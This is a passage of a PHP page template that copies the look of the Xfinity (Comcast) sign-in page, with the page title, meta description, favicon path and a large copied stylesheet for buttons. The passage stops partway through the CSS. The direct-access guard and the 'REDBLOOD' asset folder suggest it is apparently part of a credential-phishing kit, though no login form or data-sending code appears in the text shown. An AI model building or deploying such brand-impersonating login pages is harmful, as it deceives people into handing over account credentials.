<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html lang="en" class="light h-full stepped-out hydrated" data-resource-package-id="res-responsive-login-page">

<head>
    <style data-styles="">
        prism-text,
        prism-autosuggest,
        ent-recent-activity,
        prism-pagination,
        prism-header,
        prism-legal-agreement,
        prism-breadcrumb,
        prism-checkbox-group,
        prism-menu,
        prism-accordion,
        prism-modal,
        prism-next-step-bar,
        prism-radio,
        prism-radio-group,
        prism-select,
        prism-stepper-navigation,
        prism-textarea,
        prism-banner,
        prism-card,
        prism-carousel,
        prism-loading,
        prism-page-heading,
        prism-progress,
        prism-section-heading,
        prism-switch,
        prism-tabs,
        prism-tooltip,
        prism-data-grid,
        prism-form,
        prism-grid,
        prism-hero,
        prism-img,
        prism-layout,
        prism-tab,
        prism-avatar,
        prism-box,
        prism-lineitem,
        prism-notification,
        prism-checkbox,
        prism-button,
        prism-icon,
        prism-input,
        prism-badge {
            visibility: hidden
        }

        .hydrated {
            visibility: inherit
        }
    </style>
    <title>Sign in to Xfinity</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together — anytime, anywhere, on any device.">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="<?= base_url() ?>REDBLOOD/Assets/kintil/favicons/favicon-favicon-96x96.png">
    <meta name="theme-color" content="#ffffff">
    <style>
        .sc-prism-button-default-h {
            --width: auto;
            --display: inline-block;
            --justify: 'center';
            box-sizing: border-box;
            display: var(--display)
        }

        [type='button'].sc-prism-button-default-h,
        [type='reset'].sc-prism-button-default-h,
        [type='submit'].sc-prism-button-default-h {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }

        .btn.sc-prism-button-default {
            position: relative;
            display: flex;
            cursor: pointer;
            align-items: center;
            justify-items: center;
            border-width: 2px;
            border-style: solid;
            border-color: transparent;
            background-color: transparent;
            background-image: none;
            padding: 0px;
            -webkit-text-decoration-line: none;
            text-decoration-line: none;
            outline: 2px solid transparent;
            outline-offset: 2px;
            justify-content: var(--justify);
            transition: all 200ms ease-in;
            transition-property: background-color, border-color, box-shadow;
            width: var(--width)
        }

        .sc-prism-button-default-s>[slot^='icon'] {
            padding-left: 0.25rem;
            padding-right: 0.25rem;
            --icon-color: inherit
        }

        .sm.sc-prism-button-default {
            border-radius: 4px;
            padding-left: 1.5rem;
            padding-right: 1.5rem;
            padding-top: 0.75rem;
            padding-bottom: 0.75rem
        }

        .md.sc-prism-button-default {
            border-radius: 4px;
            padding-left: 2rem;
            padding-right: 2rem;
            padding-top: 1rem;
            padding-bottom: 1rem
        }

        .fill.neutral.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-neutral-base) / var(--tw-bg-opacity));
            --shadow-color: rgba(6, 6, 7, 0.51)
        }

        .fill.neutral.sc-prism-button-default:not(.disabled):hover {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-neutral-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(17, 17, 19, 0.51)
        }

        .fill.neutral.sc-prism-button-default:not(.disabled):active {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-neutral-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(23, 23, 27, 0.51)
        }

        .fill.neutral.sc-prism-button-default:not(.disabled):focus {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-neutral-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-neutral-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(17, 17, 19, 0.51)
        }

        .fill.neutral-inverse.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-inverse-base) / var(--tw-bg-opacity));
            --shadow-color: rgba(91, 91, 93, 0.51)
        }

        .fill.neutral-inverse.sc-prism-button-default:not(.disabled):hover {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-inverse-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(95, 95, 95, 0.51)
        }

        .fill.neutral-inverse.sc-prism-button-default:not(.disabled):active {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-inverse-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(75, 75, 80, 0.51)
        }

        .fill.neutral-inverse.sc-prism-button-default:not(.disabled):focus {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-inverse-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-inverse-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1-inverse));
            --shadow-color: rgba(95, 95, 95, 0.51)
        }

        .fill.theme1.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme1-base) / var(--tw-bg-opacity));
            --shadow-color: rgba(33, 18, 91, 0.51)
        }

        .fill.theme1.sc-prism-button-default:not(.disabled):hover {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme1-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(18, 0, 51, 0.51)
        }

        .fill.theme1.sc-prism-button-default:not(.disabled):active {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme1-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(12, 0, 33, 0.51)
        }

        .fill.theme1.sc-prism-button-default:not(.disabled):focus {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme1-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme1-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(18, 0, 51, 0.51)
        }

        .fill.theme2.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme2-base) / var(--tw-bg-opacity))
        }

        .fill.theme.sc-prism-button-default:not(.disabled):hover {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme2-hover) / var(--tw-bg-opacity))
        }

        .fill.theme2.sc-prism-button-default:not(.disabled):active {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme2-down) / var(--tw-bg-opacity))
        }

        .fill.theme2.sc-prism-button-default:not(.disabled):focus {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme2-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme2-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .fill.info.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-info-base) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 27, 76, 0.51)
        }

        .fill.info.sc-prism-button-default:not(.disabled):hover {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-info-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 20, 58, 0.51)
        }

        .fill.info.sc-prism-button-default:not(.disabled):active {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-info-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 16, 46, 0.51)
        }

        .fill.info.sc-prism-button-default:not(.disabled):focus {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-info-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-info-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(0, 20, 58, 0.51)
        }

        .fill.caution.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-caution-base) / var(--tw-bg-opacity));
            --shadow-color: rgba(64, 19, 0, 0.51)
        }

        .fill.caution.sc-prism-button-default:not(.disabled):hover {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-caution-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(58, 18, 0, 0.51)
        }

        .fill.caution.sc-prism-button-default:not(.disabled):active {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-caution-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(50, 15, 0, 0.51)
        }

        .fill.caution.sc-prism-button-default:not(.disabled):focus {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-caution-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-caution-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(58, 18, 0, 0.51)
        }

        .fill.positive.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-positive-base) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 35, 27, 0.51)
        }

        .fill.positive.sc-prism-button-default:not(.disabled):hover {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-positive-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 27, 20, 0.51)
        }

        .fill.positive.sc-prism-button-default:not(.disabled):active {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-positive-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 16, 12, 0.51)
        }

        .fill.positive.sc-prism-button-default:not(.disabled):focus {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-positive-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-positive-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(0, 27, 20, 0.51)
        }

        .fill.negative.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-base) / var(--tw-bg-opacity));
            --shadow-color: rgba(66, 0, 19, 0.51)
        }

        .fill.negative.sc-prism-button-default:not(.disabled):hover {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(50, 0, 15, 0.51)
        }

        .fill.negative.sc-prism-button-default:not(.disabled):active {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(34, 0, 10, 0.51)
        }

        .fill.negative.sc-prism-button-default:not(.disabled):focus {
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-negative-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-negative-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(50, 0, 15, 0.51)
        }

        .outline.neutral.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-base) / var(--tw-text-opacity));
            background-color: transparent;
            border-color: rgb(var(--border-color-stroke-neutral-base) / var(--tw-border-opacity));
            --tw-border-opacity: 0.15
        }

        .outline.neutral.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-hover) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-neutral-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(17, 17, 19, 0.51)
        }

        .outline.neutral.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-hover) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-neutral-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(23, 23, 27, 0.51)
        }

        .outline.neutral.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-hover) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-neutral-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-neutral-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(17, 17, 19, 0.51)
        }

        .outline.neutral-inverse.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            background-color: transparent;
            border-color: rgb(var(--border-color-stroke-inverse-base) / var(--tw-border-opacity));
            --tw-border-opacity: 0.15
        }

        .outline.neutral-inverse.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-hover) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-inverse-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(95, 95, 95, 0.51)
        }

        .outline.neutral-inverse.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-hover) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-inverse-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(75, 75, 80, 0.51)
        }

        .outline.neutral-inverse.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-neutral-hover) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-inverse-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-inverse-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1-inverse));
            --shadow-color: rgba(95, 95, 95, 0.51)
        }

        .outline.theme1.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme1-base) / var(--tw-text-opacity));
            background-color: transparent;
            border-color: rgb(var(--border-color-stroke-theme1-base) / var(--tw-border-opacity));
            --tw-border-opacity: 0.15
        }

        .outline.theme1.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme1-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(18, 0, 51, 0.51)
        }

        .outline.theme1.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-down) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme1-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(12, 0, 33, 0.51)
        }

        .outline.theme1.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-focus) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme1-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme1-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1));
            --shadow-color: rgba(18, 0, 51, 0.51)
        }

        .outline.theme2.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-theme2-base) / var(--tw-text-opacity));
            background-color: transparent;
            border-color: rgb(var(--border-color-stroke-theme2-base) / var(--tw-border-opacity));
            --tw-border-opacity: 0.15
        }

        .outline.theme2.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-down) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme2-hover) / var(--tw-bg-opacity))
        }

        .outline.theme2.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-down) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme2-down) / var(--tw-bg-opacity))
        }

        .outline.theme2.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-focus) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-theme2-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 rgba(0, 0, 0, 0));
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(var(--ring-color-theme2-base) / var(--tw-ring-opacity));
            --tw-ring-offset-width: 2px;
            --tw-ring-offset-color: rgb(var(--ring-offset-color-material-1))
        }

        .outline.info.sc-prism-button-default {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-info-base) / var(--tw-text-opacity));
            background-color: transparent;
            border-color: rgb(var(--border-color-stroke-info-base) / var(--tw-border-opacity));
            --tw-border-opacity: 0.15
        }

        .outline.info.sc-prism-button-default:not(.disabled):hover {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-base) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-info-hover) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 20, 58, 0.51)
        }

        .outline.info.sc-prism-button-default:not(.disabled):active {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-down) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-info-down) / var(--tw-bg-opacity));
            --shadow-color: rgba(0, 16, 46, 0.51)
        }

        .outline.info.sc-prism-button-default:not(.disabled):focus {
            --tw-text-opacity: 1;
            color: rgb(var(--text-color-inverse-focus) / var(--tw-text-opacity));
            --tw-bg-opacity: 1;
            background-color: rgb(var(--background-color-fill-info-focus) / var(--tw-bg-opacity));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), 0 0 rgba(0, 0, 0, 0);
